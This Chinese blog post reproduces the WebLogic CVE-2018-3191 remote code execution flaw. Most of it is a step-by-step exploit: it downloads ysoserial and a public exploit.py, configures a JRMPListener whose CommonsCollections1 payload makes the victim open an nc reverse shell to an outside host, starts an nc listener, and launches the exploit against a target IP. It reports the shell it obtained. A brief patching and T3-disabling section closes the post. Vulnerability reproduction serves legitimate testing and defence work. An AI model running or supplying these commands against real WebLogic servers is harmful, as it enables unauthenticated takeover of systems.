# Weblogic CVE-2018-3191 远程代码命令执行漏洞复现 - 渗透测试中心 - 博客园

> 原文：[`www.cnblogs.com/backlion/p/9851625.html`](https://www.cnblogs.com/backlion/p/9851625.html)

## 0x00 简介

北京时间 10 月 17 日，Oracle 官方发布的 10 月关键补充更新 CPU（重要补丁更新）中修复了一个高危的 WebLogic 远程代码执行漏洞（CVE-2018-3191）。该漏洞允许未经身份验证的攻击者通过 T3 协议网络访问并破坏易受攻击的 WebLogic Server，成功的漏洞利用可导致 WebLogic Server 被攻击者接管，从而造成远程代码执行。

## 0x01 漏洞复现

目标 weblogci 服务器已开放了 T3 服务，该服务器是部署在 linux 下，可以用 https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-262 进行在 docker 下部署测试环境。

![](img/b7ffa5f07aa80b0b9fa16ee8b5ae0433.png)

1.在 JRMPListener 主机（公网上的一台主机,ubunut 系统，IP 地址为：149.28.*.85）上运行以下命令:

```
wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 
java  -cp  ysoserial-0.0.6-SNAPSHOT-BETA-all.jar  ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]
```

如：

```
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'nc  -nv 149.28.*.85  5555' 
```

//注意 command 目前只有 nc 反弹成功，bash 反弹被转义了,本地监听 1099 端口，执行的命令是向 weblogic 服务器发送 nc 反弹命令的 poc。

![](img/bf6228aed1876c153a40f99d65c4ede0.png)

2.同时在 JRMPListener 主机另开一个命令窗口进行监听 nc 端口，命令如下：

```
nc  -lvvp  5555
```

![](img/1899133828ff2048ef98bd8f120c01cb.png)

3.在本地的 windows 系统攻击者主机上运行此脚本：

weblogic-spring-jndi-12.2.1.3.jar 对于 weblogic：

12.2.1.3

weblogic-spring-jndi-10.3.6.0.jar 对于 weblogic：

10.3.6.0

12.2.1.0

12.1.3.0

12.2.1.1

```
wget https://github.com/pyn3rd/CVE-2018-3191/blob/master/weblogic-spring-jndi-10.3.6.0.jar
 wget  https://github.com/pyn3rd/CVE-2018-3191/blob/master/weblogic-spring-jndi-12.2.1.3.jar
 wget https://raw.githubusercontent.com/Libraggbond/CVE-2018-3191/master/exploit.py
 python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]

python exploit.py 66.42.*.195 7001  weblogic-spring-jndi-10.3.6.0.jar  149.28.146.85    1099   //这里的 66.42.*.195 是 weblogc 服务器，7001 为 weblogic 服务器端口;149.28.*.85 为 JRMPListener 主机，主机的监听端口为 1099
```

![](img/fa35bc3fa5a4087c7b709334793bd62c.png)

最终可以看到反弹的 shell:

![](img/811832d6d4fcbad87185ecd03281ce72.png)

## 0x02 漏洞修复

1.Oracle 官方已经在 10 月关键补丁更新 CPU（重要补丁更新）中修复了该漏洞，强烈建议受影响的用户尽快升级更新进行防护。

[`www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html#AppendixFMW`](https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html#AppendixFMW)

2.禁止 T3 协议

## 0x03 参考链接

[`mp.weixin.qq.com/s/ebKHjpbQcszAy_vPocW0Sg`](https://mp.weixin.qq.com/s/ebKHjpbQcszAy_vPocW0Sg)

[`github.com/Libraggbond/CVE-2018-3191`](https://github.com/Libraggbond/CVE-2018-3191)